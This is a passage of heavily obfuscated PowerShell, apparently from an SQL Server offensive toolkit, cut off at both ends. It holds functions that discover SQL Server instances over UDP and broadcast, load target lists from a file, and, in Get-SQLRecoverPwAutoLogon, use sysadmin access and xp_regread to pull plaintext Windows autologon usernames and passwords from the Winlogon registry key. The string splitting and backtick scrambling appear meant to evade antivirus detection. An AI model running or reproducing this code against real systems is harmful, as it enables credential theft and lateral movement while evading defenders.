                ${ud`Pt`i`meoU`TMIL`sec} = ${UDp`TImeo`Ut} * 1000
                ${udp`ClIe`NT}."C`LIE`NT"."r`e`CEivE`TiMeoUt" = ${udP`Ti`mEOUtmI`l`sEC}
                ${U`DpcL`iENT}.("{1}{0}"-f'nect','Con').Invoke(${c`o`Mpute`RnAme},0x59a)
                ${U`Dp`PaC`Ket} = 0x03

                
                ${U`DpEN`d`pOINt} = &("{1}{0}{2}"-f '-Obj','New','ect') -TypeName ("{1}{0}{4}{5}{3}{2}" -f 's','Sy','ndpoint','et.Ipe','tem.','N') -ArgumentList (  $F1iL::"A`Ny", 0)
                ${U`DPCLI`eNT}."cL`IeNt"."BL`oCki`NG" = ${t`RUE}
                [void]${Ud`p`cL`IENT}.("{0}{1}" -f'Se','nd').Invoke(${U`DPPa`cKet},${uD`ppack`Et}."Le`NgtH")

                
                ${b`YTEsr`ECI`VEd} = ${U`DPc`lIeNt}."R`EceIve"([ref]${UDP`E`NDP`oinT})
                ${REsPoN`se} =   $80zn3::"As`cii"."g`ETSt`RINg"(${by`T`esreci`V`eD}).("{1}{0}" -f'plit','s').Invoke(';')

                ${VA`lues} = @{}

                for(${i} = 0; ${i} -le ${Re`S`POnsE}."lEn`Gth"; ${i}++)
                {
                    if(!  (  ChilDiTEM  VAriAblE:aEjp).vAluE::"i`s`NulLO`R`emptY"(${re`sponSE}[${I}]))
                    {
                        ${V`Alues}."a`dD"((${R`EsPonSE}[${i}].("{1}{0}{2}"-f'owe','ToL','r').Invoke() -replace ((("{0}{2}{1}" -f'[','W]','tHu'))  -ReplACE  ([cHar]116+[cHar]72+[cHar]117),[cHar]92), ''),${r`e`S`pONse}[${i}+1])
                    }
                    else
                    {
                        if(!  (  geT-vArIABLE  ("A"+"ejP") ).vaLuE::("{2}{0}{1}" -f 'l','lOrEmpty','IsNu').Invoke(${v`ALu`ES}.'tcp'))
                        {
                            if(-not ${S`U`Pp`REssvErBoSE})
                            {
                                ${d`iscovE`REDI`NSTaNCe} = "$ComputerName\"+${vA`Lu`Es}.'instancename'
                                &("{1}{2}{0}{3}"-f 'erbos','Write','-V','e') -Message ("$ComputerName "+'- '+'F'+'ound: '+"$DiscoveredInstance")
                            }

                            
                            ${n`Ull} = ${TAbL`E`Res`UL`TS}."r`OWS"."A`DD"(
                                [string]${C`oMpU`TER`Na`Me},
                                [string]"$ComputerName\"+${vALU`ES}.'instancename',
                                [string]${v`ALUEs}.'instancename',
                                [string]${IPA`Dd`Re`SS},
                                [string]${vA`LUES}.'tcp',
                                [string]${V`A`lUeS}.'version',
                            [string]${Va`l`UES}.'isclustered')
                            ${VA`LUES} = @{}
                        }
                    }
                }

                
                ${UdPCl`i`ENT}.("{1}{0}" -f'se','Clo').Invoke()
            }
            catch
            {
                
                
                

                
                
            }
        }
        if(-not ${sUPpR`eS`svE`R`BosE})
        {
            &("{2}{3}{0}{1}" -f'os','e','Write-Ve','rb') -Message (' '+'- '+"$ComputerName "+'- '+'UD'+'P '+'Sca'+'n '+'Complet'+'e'+'.')
        }
    }

    End
    {
        
        ${TaBL`Ere`s`Ults}
    }
}







function GEt-s`ql`in`STANC`ebRoAdcaSt 
{
    

    [CmdletBinding()]
    Param(
            [Parameter(manDAtORy = ${fA`Lse},
        HElPmEsSAGE = {"{14}{1}{4}{23}{13}{2}{21}{10}{6}{9}{17}{19}{22}{8}{15}{16}{18}{11}{27}{20}{0}{3}{7}{5}{26}{12}{24}{25}"-f'es t','his wil',' of','o ga','l sen','r','nt','the','QL Se','if','de','ta','informat','st to each','T','rver ','i','i','ns','ed','c',' the i',' S','d a UDP reque','io','n..',' more ','n'})]
        [switch]${U`DPPI`NG}
    )

    Begin
    {
        
        ${tblsql`SE`Rv`E`Rs} = &("{1}{2}{0}"-f 'ct','New-Obj','e') -TypeName ("{4}{1}{0}{5}{2}{3}"-f 'at','stem.D','a','ble','Sy','a.DataT')
        ${Nu`lL} = ${T`BlsQ`l`SeRV`eRs}."C`oLumnS".("{1}{0}" -f'dd','A').Invoke(("{1}{0}{2}"-f 'om','C','puterName'))
        ${n`UlL} = ${tblsQl`seR`V`ers}."C`OlUM`Ns".("{0}{1}" -f 'Ad','d').Invoke(("{2}{0}{1}"-f'a','nce','Inst'))
        ${n`Ull} = ${tBL`s`Q`LsE`RVErS}."CO`lUMNs".("{0}{1}"-f 'A','dd').Invoke(("{1}{0}{2}" -f 'Cluste','Is','red'))
        ${Nu`lL} = ${tblS`Q`LSerVERs}."ColUM`Ns".("{1}{0}" -f'd','Ad').Invoke(("{1}{0}{2}"-f 'sio','Ver','n'))        

        &("{0}{2}{3}{1}"-f 'W','bose','ri','te-Ver') ("{4}{12}{13}{8}{1}{14}{3}{11}{2}{9}{5}{6}{10}{15}{7}{0}{16}" -f'ma','y SQL S','nc','ve','Attempting ','n the bro','ad','o','entif','es o','cast','r insta','to ','id','er',' d','in.')
    }

    Process
    {
        try {

            
            ${iNSTA`NC`ES} =   $AIH9g::"I`NstaNcE".("{0}{2}{1}" -f 'GetDataS','rces','ou').Invoke()

            
            ${ins`T`ANcEs} | 
            &("{2}{3}{0}{1}" -f'bje','ct','ForEach','-O') {
                [string]${InS`TANcE`T`EMP} =  ${_}."insTaNc`E`NAME"
                if(${I`N`sT`ANc`ETEmP}){
                    [string]${inS`Ta`Nc`eNA`mE} = ${_}."SERV`erNa`me" + "\" + ${_}."i`NstAn`C`eNAME"
                }else{
                    [string]${i`NST`AN`CEnaMe} = ${_}."SErvER`Na`mE" 
                }
                [string]${co`mpU`T`e`RnaMe} = ${_}."sE`RVe`RNa`mE"
                [string]${IsCL`U`stE`REd}  = ${_}."Isclus`T`Er`eD"
                [string]${vers`IOn}      = ${_}."Ve`RS`IoN"

                
                ${Tbl`Sq`lse`RVeRs}."R`ows".("{1}{0}"-f'd','Ad').Invoke(${cOm`p`UTeRN`Ame}, ${INST`AN`cenAmE}, ${I`sclUSter`Ed}, ${ve`Rs`IoN}) | &("{2}{0}{1}" -f'-N','ull','Out')
            }
        }
        catch{

            
            ${e`R`RO`RmeSsAgE} = ${_}."e`XC`ePtION"."m`EsS`Age"
            &("{1}{0}{2}"-f'i','Wr','te-Host') -Message ("{2}{1}{3}{0}" -f 'led.','pe',' O','ration Fai')
            &("{3}{0}{1}{2}" -f'r','i','te-Host','W') -Message (' '+'Erro'+'r:'+' '+"$ErrorMessage")     
        }
    }

    End
    {               
        
        ${iN`sTa`NC`eco`UnT} = ${TBl`sQ`lSeRVERs}."ro`Ws"."Cou`NT"
        &("{1}{4}{3}{2}{0}"-f'se','W','o','b','rite-Ver') ("$InstanceCount "+'SQ'+'L '+'Se'+'rve'+'r '+'in'+'stance'+'s '+'we'+'re '+'foun'+'d.')
        
        
        if(${UD`PPI`NG}){
            &("{0}{1}{2}" -f'Write-V','er','bose') ('Per'+'f'+'o'+'rming '+'U'+'DP '+'pin'+'g '+'agains'+'t'+' '+"$InstanceCount "+'SQL'+' '+'S'+'erve'+'r '+'inst'+'ance'+'s'+'.')
            ${T`BLS`QL`sErVE`RS} |
            &("{3}{0}{1}{4}{2}"-f 'o','rEa','bject','F','ch-O'){
                ${Cu`Rr`EntcOM`P`UtER} = ${_}."coMU`T`eR`Name"                
                &("{4}{2}{6}{3}{5}{0}{1}" -f'c','anUDP','SQLIns','e','Get-','S','tanc') -ComputerName ${_}."C`Om`PuTErnamE" -SuppressVerbose
            }
        }         

        
        if(-not ${UdP`P`INg}){
            ${Tb`LSqL`seRVERs}
        }
    }
}







function G`Et`-s`qL`iNSTaNCescA`N`UDPtHREA`d`ed
{
    

    [CmdletBinding()]
    param(

        [Parameter(mandATOrY = ${t`RUE},
                VALUEFROMPipelInE = ${T`RUe},
                valUeFROmPIpElinebyProPERTYnaMe = ${tr`Ue},
        heLPmesSaGE = {"{9}{6}{2}{5}{0}{3}{8}{7}{4}{1}" -f ' address to enumerat','rom.','me o','e SQL Inst','f','r IP','mputer na',' ','ance','Co'})]
        [string]${cOmpu`T`ErN`A`mE},

        [Parameter(mANDAToRy = ${fa`L`Se},
                VaLuEFROMpIpElInebypROpertynaMe = ${t`RUE},
        hELpMeSSage = {"{9}{6}{10}{8}{7}{2}{0}{3}{5}{4}{1}"-f' ','e.','out','= mor','curat','e ac','eout','onger time',' L','Tim',' in seconds.'})]
        [int]${Ud`P`T`ImeouT} = 2,

        [Parameter(MAndatOrY = ${fA`lSE},
        hELPMesSAgE = {"{4}{1}{0}{3}{2}" -f 'f','r o','hreads.',' t','Numbe'})]
        [int]${T`hR`eAdS} = 5,

        [Parameter(maNDAtOry = ${fal`SE},
        heLPmESSaGE = {"{4}{8}{9}{0}{12}{1}{10}{6}{11}{5}{7}{3}{2}" -f 'bos',' ','ed.','ion is wrapp','Su','  U','rs','sed when funct','ppress ve','r','erro','.','e'})]
        [switch]${SUpP`RESsvE`R`BOse}
    )

    Begin
    {
        
        ${TAbL`ER`E`SU`Lts} = &("{2}{1}{3}{0}"-f'ct','w-Obj','Ne','e') -TypeName ("{2}{3}{4}{0}{1}" -f 'ab','le','system.Dat','a.D','ataT') -ArgumentList ("{0}{1}" -f'Tab','le')
        ${nu`Ll} = ${TabL`ErE`sULTS}."C`oLumnS".("{0}{1}" -f'ad','d').Invoke(("{3}{1}{2}{0}" -f'Name','ute','r','Comp'))
        ${n`ULl} = ${T`ABleresU`lts}."c`olU`mns".("{1}{0}"-f 'dd','a').Invoke(("{1}{2}{0}"-f 'tance','I','ns'))
        ${N`ULL} = ${T`AbLEr`Es`ULTs}."cOluM`Ns".("{0}{1}" -f 'ad','d').Invoke(("{2}{1}{0}" -f 'e','ceNam','Instan'))
        ${n`ULl} = ${TABle`RES`UltS}."colu`mns".("{0}{1}"-f'a','dd').Invoke(("{2}{1}{0}" -f'P','verI','Ser'))
        ${n`ULl} = ${t`Ab`lEr`ESults}."Col`Um`NS".("{0}{1}"-f'ad','d').Invoke(("{0}{2}{1}"-f'T','Port','CP'))
        ${n`Ull} = ${T`Abl`e`REsULtS}."CO`Lumns".("{0}{1}" -f'ad','d').Invoke(("{2}{0}{1}" -f'rsi','on','BaseVe'))
        ${Nu`lL} = ${T`A`BLe`Re`sULtS}."c`OLUmNS".("{1}{0}"-f'd','ad').Invoke(("{1}{2}{3}{0}" -f'ed','Is','Clust','er'))
        ${tAbleR`e`sU`ltS}.("{0}{1}"-f'Clea','r').Invoke()

        
        ${P`Ipe`lin`e`ITEms} = &("{1}{0}{3}{2}"-f'e','N','-Object','w') -TypeName ("{0}{1}{2}{3}{5}{4}" -f'S','ys','tem.','Dat','DataTable','a.')

        
        if(${InS`Tan`Ce})
        {
            ${PrOVId`EINs`Ta`NcE} = &("{2}{0}{1}" -f'-','Object','New') -TypeName ("{0}{1}{2}"-f'PSObj','e','ct') -Property @{
                ("{0}{1}{2}" -f'In','stanc','e') = ${INS`Ta`NcE}
            }
            ${pipe`LIn`EiteMs} = ${pipe`liNEItE`Ms} + ${pRoViDei`NS`T`ANce}
        }
    }

    Process
    {
        
        ${pi`P`eLiNeItemS} = ${p`ipeLin`E`i`TeMs} + ${_}
    }

    End
    {
        
        ${MYS`cRiPt`BL`OcK} = {
            ${cOmPU`Te`R`NAME} = ${_}."coM`pUt`E`RnAme"

            if(-not ${S`UpprES`SV`E`RBOSe})
            {
                &("{0}{2}{3}{4}{1}" -f 'Wri','ose','te-V','er','b') -Message (' '+'- '+"$ComputerName "+'- '+'U'+'DP '+'Sca'+'n '+'S'+'tart.')
            }


            
            if (${C`o`Mpu`TeRnAMe} -ne '')
            {
                
                try
                {
                    
                    ${IpaD`dr`Ess} =  ( gCI ('V'+'ArIaBle:'+'Q'+'Vn'+'j6')).vaLuE::("{1}{0}{3}{4}{2}" -f 'tHostAddr','Ge','s','ess','e').Invoke(${coMPUT`erN`AME})

                    
                    ${UD`PCL`iEnT} = &("{0}{2}{1}" -f'New-Ob','t','jec') -TypeName ("{0}{2}{3}{4}{1}" -f'System.','client','Net.So','ckets','.Udp')

                    
                    ${uD`PTImEo`U`TmilSEc} = ${uDP`TIm`EOUT} * 1000
                    ${U`DPc`liEnT}."cli`ENT"."R`e`Ce`iVEtIm`eOUT" = ${U`dP`TIMEOu`TmiLs`ec}
                    ${UD`PClie`NT}.("{0}{1}{2}" -f'C','o','nnect').Invoke(${comp`UT`ernaME},0x59a)
                    ${udPp`A`ck`ET} = 0x03

                    
                    ${uDPe`N`DpO`INt} = &("{2}{1}{0}" -f't','bjec','New-O') -TypeName ("{3}{2}{0}{1}{4}" -f 't.','Ipe','tem.Ne','Sys','ndpoint') -ArgumentList (  ( chILdiTEm  ("v"+"AriaBlE:"+"F"+"1Il") ).vAlUE::"A`NY", 0)
                    ${UdP`C`Lie`NT}."c`lIE`NT"."bl`oCKi`NG" = ${tR`Ue}
                    [void]${U`D`PCl`iEnT}.("{1}{0}" -f'd','Sen').Invoke(${uDP`pA`C`KeT},${UDP`PaC`k`ET}."lE`NG`TH")

                    
                    ${byTeSR`ECi`VeD} = ${UDp`C`LienT}."R`e`CeIvE"([ref]${u`D`p`EndpOInT})
                    ${reS`PO`N`SE} =  ( GEt-vARIable ("8"+"0zn3") -vaLueOnLY )::"AS`ciI"."geTs`Tr`iNG"(${B`YT`esrEC`I`VeD}).("{0}{1}"-f 'spl','it').Invoke(';')

                    ${V`AlUEs} = @{}

                    for(${i} = 0; ${I} -le ${Re`Sp`oNSe}."leN`Gth"; ${I}++)
                    {
                        if(!  ( geT-VarIAblE  Aejp  -VALUE )::"IS`NU`lLO`REmPty"(${ReSPOn`SE}[${i}]))
                        {
                            ${VaLu`ES}."A`DD"((${R`ES`PoNse}[${I}].("{1}{0}"-f'er','ToLow').Invoke() -replace ((("{0}{1}"-f'[g5t','W]'))  -rEPLACE([ChAr]103+[ChAr]53+[ChAr]116),[ChAr]92), ''),${rE`S`p`ONsE}[${i}+1])
                        }
                        else
                        {
                            if(!  $AEJP::("{4}{1}{2}{0}{3}" -f'rEmpt','l','O','y','IsNul').Invoke(${valU`es}.'tcp'))
                            {
                                if(-not ${sUppR`Es`sVeRBO`SE})
                                {
                                    ${d`is`c`oV`EREd`INSTaNCE} = "$ComputerName\"+${v`AlueS}.'instancename'
                                    &("{3}{1}{2}{0}"-f 'e','ite-Verbo','s','Wr') -Message (' '+'- '+"$ComputerName "+'- '+'Fo'+'und: '+"$DiscoveredInstance")
                                }

                                
                                ${Nu`lL} = ${tabL`ER`Es`Ul`Ts}."Ro`Ws"."a`dD"(
                                    [string]${cOMpUt`ER`NAMe},
                                    [string]"$ComputerName\"+${VAl`U`Es}.'instancename',
                                    [string]${VaL`UeS}.'instancename',
                                    [string]${ipA`dD`REsS},
                                    [string]${v`ALUeS}.'tcp',
                                    [string]${V`AL`UEs}.'version',
                                [string]${VaLu`es}.'isclustered')
                                ${vaL`U`es} = @{}
                            }
                        }
                    }

                    
                    ${Ud`Pcli`ENt}.("{1}{0}"-f'lose','C').Invoke()
                }
                catch
                {
                    
                    
                    

                    
                    
                }
            }

            if(-not ${SU`ppRES`sVe`Rbo`se})
            {
                &("{0}{2}{3}{1}" -f'Wri','e','te-','Verbos') -Message (' '+'- '+"$ComputerName "+'- '+'U'+'DP '+'S'+'can '+'E'+'nd.')
            }
        }

        
        ${pip`ElIN`eIt`EmS} | &("{2}{1}{0}{3}" -f'oke-Pa','nv','I','rallel') -ScriptBlock ${MyS`c`RIpTB`LO`CK} -ImportSessionFunctions -ImportVariables -Throttle ${Thr`e`AdS} -RunspaceTimeout 2 -Quiet -ErrorAction ("{0}{2}{3}{1}" -f 'Silent','tinue','lyCo','n')

        return ${TABl`EReSu`LTs}
    }
}





Function  get-sQ`LI`Nst`ANCEFile
{
    
    [CmdletBinding()]
    Param(
        [Parameter(maNdAtOry = ${t`Rue},
        HElPmesSaGe = {"{1}{2}{0}{3}"-f 'ath','The ','file p','.'})]
        [string]${FI`LeP`ATH}
    )

    Begin
    {
        
        ${TbL`FI`l`einSTaNcES} = &("{0}{1}{2}"-f 'New','-O','bject') -TypeName ("{3}{4}{2}{1}{5}{0}"-f 'ble','ata','.Data.D','Syste','m','Ta')
        ${nu`ll} = ${tblfilei`NS`T`A`NcEs}."Co`l`UMNs".("{1}{0}"-f'd','Ad').Invoke(("{2}{1}{3}{0}"-f'e','erN','Comput','am'))
        ${n`UlL} = ${TBl`FI`Lein`Sta`NcEs}."CoLu`m`NS".("{1}{0}" -f'dd','A').Invoke(("{0}{1}"-f 'Ins','tance'))
    }

    Process
    {
        
        if(&("{2}{1}{0}" -f't-Path','s','Te') ${FiLE`Path})
        {
            &("{1}{2}{0}{3}"-f 'erb','Wri','te-V','ose') -Message ("{0}{5}{6}{1}{3}{4}{2}{7}"-f 'Importin','r','p','o','m file ','g insta','nces f','ath.')
        }
        else
        {
            &("{2}{1}{0}"-f't','s','Write-Ho') -InputObject ("{9}{11}{8}{10}{5}{2}{7}{4}{6}{0}{1}{3}" -f 'v','al','s not','id.','ar to ','e','be ',' appe','le path ','F','do','i')
            break
        }

        
        &("{3}{0}{1}{2}" -f't','-C','ontent','Ge') -Path ${fI`le`pAth} |
        &("{0}{3}{1}{2}" -f'ForEach-Ob','c','t','je') -Process {
            ${I`N`sTAnce} = ${_}
            if(${I`NS`TaNCE}.("{1}{0}" -f'lit','Sp').Invoke(',')[1])
            {
                ${CoM`pUTERNa`Me} = ${i`Ns`TANCe}.("{1}{0}" -f't','Spli').Invoke(',')[0]
            }
            else
            {
                ${cOM`p`U`TERName} = ${iNSt`Ance}.("{0}{1}"-f 'S','plit').Invoke('\')[0]
            }

            
            if(${_} -ne '')
            {
                ${N`ULl} = ${TB`lFIlEINSt`A`Nces}."rO`Ws".("{1}{0}" -f'd','Ad').Invoke(${C`omPu`TerN`AME},${In`s`Tance})
            }
        }
    }

    End
    {

        
        ${F`I`LEiNStANCEcOu`NT} = ${TBLf`ileIN`StAn`ces}."ro`ws"."coU`NT"
        &("{0}{4}{2}{3}{1}"-f'W','se','rb','o','rite-Ve') -Message ("$FileInstanceCount "+'inst'+'an'+'ces '+'whe'+'re '+'foun'+'d '+'i'+'n '+"$FilePath.")

        
        ${Tbl`FiLeiNSTaN`c`eS}
    }
}












Function   get-s`ql`R`E`Co`VErpwAuT`OLOgon
{
    
    [CmdletBinding()]
    Param(
        [Parameter(mANdaToRy = ${f`A`Lse},
        heLpmEssaGE = {"{0}{2}{4}{3}{6}{1}{8}{7}{5}" -f'SQL S','t','erver','or domai',' ','e with.','n account to au','cat','henti'})]
        [string]${usE`RNa`me},

        [Parameter(mAndatOrY = ${f`Al`SE},
        HeLPmESSaGe = {"{9}{5}{11}{3}{6}{2}{7}{1}{0}{10}{8}{4}" -f'ti','uthen','to','in','.','QL Server',' account password ',' a','ate with','S','c',' or doma'})]
        [string]${PA`s`sw`ORd},

        [Parameter(maNdaTOry = ${FAl`se},
        hELpMESsagE = {"{3}{5}{6}{0}{2}{4}{1}" -f'denti','.','al','Windows','s',' c','re'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${C`REd`e`NTIaL} =   (  Get-VARIabLE  0459m2  -vALUeOnL  )::"EM`PTY",

        [Parameter(mANdatoRy = ${f`A`LsE},
                vAluEFrOmPiPeLineBYprOPeRTyNAME = ${tr`Ue},
        HElpMessAGe = {"{1}{4}{7}{0}{5}{6}{2}{3}{8}" -f'rver instance ','S','ion ','to','Q','to con','nect','L Se','.'})]
        [string]${i`N`STANCE},

        [Parameter(MandatoRY = ${f`ALSe},
        HElPMeSsage = {"{9}{12}{15}{13}{11}{2}{1}{14}{0}{5}{7}{3}{8}{6}{4}{10}"-f 'd','rors.  ',' er','o','wrapp',' ',' ','when functi','n is','Sup','ed.','ose','pre','erb','Use','ss v'})]
        [switch]${Su`P`prEsSV`erb`OSe}
    )

    Begin
    {
        
        ${tBL`WiNau`T`OcReds} = &("{3}{0}{1}{2}" -f'ew-','Objec','t','N') -TypeName ("{2}{3}{5}{4}{0}{1}{6}" -f 'ata','Ta','Syst','em.D','a.D','at','ble')
        ${tbLwInau`T`O`c`RedS}."ColUM`NS".("{1}{0}" -f'dd','A').Invoke(("{0}{2}{1}" -f'Comp','erName','ut')) | &("{0}{1}{2}" -f'O','ut','-Null')
        ${t`BLW`in`AUtocRedS}."cOlU`MnS".("{1}{0}" -f'dd','A').Invoke(("{0}{1}{2}" -f'Inst','a','nce')) | &("{0}{1}"-f 'Out-N','ull')
        ${TblWI`NA`UTOcr`eDs}."c`olUM`NS".("{1}{0}" -f'dd','A').Invoke(("{0}{1}"-f 'Doma','in')) | &("{2}{1}{0}" -f'Null','t-','Ou')
        ${Tb`lwINa`Ut`oCREDS}."Co`lumns".("{0}{1}" -f 'Ad','d').Invoke(("{0}{2}{1}"-f 'Use','me','rNa')) | &("{0}{2}{1}" -f'O','-Null','ut')
        ${TbLwIna`UTO`C`REDS}."c`ol`UMNs".("{0}{1}"-f'A','dd').Invoke(("{1}{0}" -f'assword','P')) | &("{2}{0}{1}" -f'ut','-Null','O')
    }

    Process
    {
        
        ${C`O`mPutEr`N`Ame} = &("{8}{5}{3}{2}{1}{0}{4}{6}{7}" -f'eFr','am','rN','e','omInstan','-Comput','c','e','Get') -Instance ${In`S`T`Ance}

        
        if(-not ${iNs`TA`N`Ce})
        {
            ${I`NsTANCe} = ${ENV:`co`MPuTErN`AmE}
        }

        
        ${TeS`T`co`NnE`CtIon} = &("{2}{3}{6}{5}{0}{4}{1}" -f 'LCon','nTest','G','e','nectio','-SQ','t') -Instance ${InSTAn`Ce} -Username ${User`NA`mE} -Password ${Pa`sSW`OrD} -Credential ${CreDE`NtI`AL} -SuppressVerbose | &("{0}{2}{3}{1}" -f'W','t','here','-Objec') -FilterScript {
            ${_}."S`TATUs" -eq ("{0}{2}{1}"-f 'Acce','le','ssib')
        }
        if(${TEStcon`N`Ec`TiOn})
        {
            if( -not ${SUpPRe`ssVER`B`ose})
            {
                &("{3}{4}{2}{1}{0}" -f'rbose','e','-V','W','rite') -Message ("$Instance "+': '+'C'+'o'+'nnection'+' '+'Su'+'ccess'+'.')
            }
        }
        else
        {
            if( -not ${SUppre`sSv`eRbo`SE})
            {
                &("{2}{1}{4}{3}{0}"-f 'e','e-Ve','Writ','bos','r') -Message ("$Instance "+': '+'Co'+'nnectio'+'n'+' '+'Failed'+'.')
            }
            return
        }       

        
        ${IsS`ysAd`Min} = &("{4}{1}{3}{0}{2}"-f'c','et-S','k','QLSysadminChe','G') -Instance ${i`NstANce} -Credential ${C`R`eDeNTI`AL} -Username ${u`s`ernAMe} -Password ${p`AsSw`OrD} -SuppressVerbose | &("{2}{0}{1}" -f'-O','bject','Select') -Property ("{3}{1}{0}{2}"-f'sad','sSy','min','I') -ExpandProperty ("{2}{0}{1}" -f 'sS','ysadmin','I')

        
        ${SQ`lvERsI`ON`Fu`LL} = &("{4}{3}{2}{5}{1}{0}"-f'nfo','I','SQLS','-','Get','erver') -Instance ${Inst`A`Nce} -Username ${UseRnA`Me} -Password ${PaSS`w`ORd} -Credential ${CreD`e`NTiaL} -SuppressVerbose | &("{2}{0}{3}{1}" -f'e','t-Object','S','lec') -Property ("{2}{1}{0}{3}"-f 'VersionNum','r','SQLServe','ber') -ExpandProperty ("{3}{4}{1}{2}{5}{0}{6}" -f'nN','V','ers','SQLSer','ver','io','umber')
        if(${S`Ql`Vers`ioNf`ULl})
        {
            ${s`qLV`er`SiOnsHoRT} = ${sQlve`Rs`io`NfUlL}.("{1}{0}"-f'lit','Sp').Invoke('.')[0]
        }

        
        if(${ISs`YSAdm`In} -ne "Yes")
        {          
            &("{1}{0}{2}"-f'rite-Ver','W','bose') ("$Instance "+': '+'Th'+'is '+'fu'+'ncti'+'on '+'re'+'q'+'uires '+'sysa'+'d'+'min '+'privileg'+'es'+'. '+'Do'+'ne.')
            Return
        }

        
        ${DE`Fau`LTqueRY} = ((("{14}{8}{30}{2}{27}{5}{22}{9}{37}{19}{17}{36}{42}{25}{15}{29}{38}{1}{32}{10}{26}{18}{28}{39}{31}{4}{41}{11}{40}{16}{24}{23}{34}{0}{6}{20}{21}{35}{3}{12}{7}{13}{33}" -f 'ootkey		= N{0}HKEY_LOCAL_MACHINE{0},
        @key			= N{0}S','.dbo.xp_regread
        @rootkey		= N{0}HKEY_LOCAL_MAC','------','s
','     @rootkey		= N{0}HKEY_LOCAL_MACHINE{0},
 ','        ','OFTWARE{1}Microsoft{1}Windows NT{1}CurrentVersion{1}Wi','in, Username = @AutoLoginUse','---------',' Windows Auto ','rosoft{1}Windows NT{1}CurrentVersion{1}Winlogon{0},
        @value_name		= N{0}DefaultDomainName{0},
        @value			= @AutoLoginDomain output

        -- Get AutoLogin DefaultUsername
 ','{1}Windows NT{1}CurrentVersion{1}Winlog','        SELECT Domain = @AutoLoginDoma','r, Password = @AutoLogin','
        --------------------------------------------','UTE mas','      @value_name		= N{0}DefaultUserName{0},
        @value			= @AutoLoginUser output

        -- Get AutoLogin DefaultUsername
        DECLARE @AutoLoginPassword  SYSNAME
      ','-------------------------------','oLoginUser  SYSNAME
      ','entials from the Registry
        ---------------','nlogon{0},
        @value_name		=',' N{0}DefaultPassword{0},
      ','-- Get','p_regread
       ','  EXECUTE master.dbo.x','n  SYSNAME
        EXEC','       DECLARE @Aut','----------
','  E','te','----','regread
   ','HINE{0},
        @key			= N{0}SOFTWARE{1}Mic','Password',' @r','  @value			= @AutoLoginPassword output

        -- Display Result','---------------------------

        -- Get AutoLogin Default Domain
        DECLARE @AutoLoginDo','Login Cred','r','XECUTE master.dbo.xp_','on{0},
  ','       @key			= N{0}SOFTWARE{1}Microsoft','mai'))  -F[char]39,[char]92)

        
        ${defAul`TR`ESU`lts} = &("{0}{1}{2}" -f 'Get','-SQLQ','uery') -Instance ${In`s`TanCe} -Query ${d`efau`ltQ`UerY} -Username ${USer`Na`mE} -Password ${PA`SS`wORd} -Credential ${Cre`dEN`Ti`AL} -SuppressVerbose     
        ${DE`FaULTU`SE`Rna`Me} = ${dEFA`U`LTRE`SuL`TS}."user`N`Ame"
        if(${defaUlTUS`e`R`NA`Me}."lE`Ng`Th" -ge 2){

            
            ${DEf`AUl`T`Res`ULts} | &("{1}{0}{4}{3}{2}" -f 'ac','ForE','ect','bj','h-O'){                
                ${T`BlWInautO`crE`ds}."r`owS".("{0}{1}"-f 'A','dd').Invoke(${C`OmPUTEr`NAME}, ${In`StA`NCe},${_}."DO`mA`in",${_}."UseRn`A`mE",${_}."PaS`sWOrd") | &("{1}{2}{0}"-f 'll','Ou','t-Nu')
            }                    
        }else{
            &("{1}{2}{0}{3}" -f 'Ver','Wri','te-','bose') ("$Instance "+': '+'N'+'o '+'def'+'ault'+' '+'auto'+' '+'log'+'in'+' '+'cre'+'dent'+'ials '+'foun'+'d.')
        }

        
        ${ALTQu`E`Ry} = ((("{18}{1}{24}{14}{29}{3}{28}{26}{17}{5}{22}{25}{6}{19}{0}{7}{2}{21}{27}{20}{15}{10}{23}{4}{11}{12}{16}{9}{13}{8}" -f 'utoLogin DefaultUsername
        DECLARE @Alt','----------------------------','ot','in Default Domain
        DEC','        @key',' NTsFiCurrentVersionsFiWinlogonApj,
      ','ultDomainNameApj,
        @value			= @AltAutoLoginDomain output

        -- Get A','AutoLoginUser  SYSNAME
        EXECUTE master.dbo.xp_regread
        @ro','@AltAutoLoginPassword','tPasswordApj,
        @value			= @AltAutoLoginPassword output

        -- Display Results
        SELECT Domain = @AltAutoLoginDomain, Username','       @rootkey		= NApjHKEY_L','			= NApjSOFTWAREsFiMicr','osoftsFiWindows NTsFiCurrentVersionsFiWinlogonApj,
',' = @AltAutoLoginUser, Password = ','ive Windows Auto Login Credentials from the Registry
        -----------------------------','LoginPassword  SYSNAME
        EXECUTE master.dbo.xp_regread
 ','        @value_name		= NApjAltDefaul','bo.xp_regread
        @rootkey		= NApjHKEY_LOCAL_MACHINEApj,
        @key			= NApjSOFTWAREsFiMicrosoftsFiWindows','
        ---------------------','lt A','y			= NApjSOFTWAREsFiMicrosoftsFiWindows NTsFiCurrentVersionsFiWinlogonApj,
        @value_name		= NApjAltDefaultUserNameApj,
        @value			= @AltAutoLoginUser output

        -- Get Alt AutoLogin DefaultUsername
        DECLARE @AltAuto','key		= NApjHKEY_LOCAL_MACHINEAp','  @value_name		= NApjAltDef','OCAL_MACHINEApj,
','------------------------
        -- Get Alternat','a','Domain  SYSNAME
        EXECUTE master.d','j,
        @ke','LARE @AltAutoLogin','--------------------------------------------

        -- Get Alt AutoLog'))-cREpLaCE([chaR]65+[chaR]112+[chaR]106),[chaR]39 -replaCe([chaR]115+[chaR]70+[chaR]105),[chaR]92)

        
        ${altr`e`SULtS} = &("{0}{3}{2}{1}" -f 'G','Query','L','et-SQ') -Instance ${i`N`STANCE} -Query ${a`LTQUe`Ry} -Username ${useRN`A`me} -Password ${pa`s`sWORD} -Credential ${cREdE`NTI`Al} -SuppressVerbose
        ${a`l`TU`SerNaMe} = ${Al`TRes`ULts}."UsernA`me"
        if(${a`Lt`Us`ErnAmE}."l`e`NGtH" -ge 2){                            

             
            ${Al`T`R`esUlTs} | &("{1}{0}{2}"-f'h-Objec','ForEac','t'){               
                ${T`BLWINAu`Toc`ReDs}."R`ows".("{1}{0}"-f'd','Ad').Invoke(${compU`Te`RNAme}, ${iNST`AN`CE},${_}."DoM`AiN",${_}."US`eRn`AMe",${_}."pAss`W`OrD") | &("{2}{1}{0}"-f 'ull','t-N','Ou')
            }
        }else{
            &("{1}{2}{3}{0}"-f 'se','Wri','t','e-Verbo') ("$Instance "+': '+'No'+' '+'al'+'ter'+'nativ'+'e '+'au'+'to '+'login'+' '+'c'+'redentia'+'ls '+'foun'+'d'+'.')
        }
    }

    End
    {
        
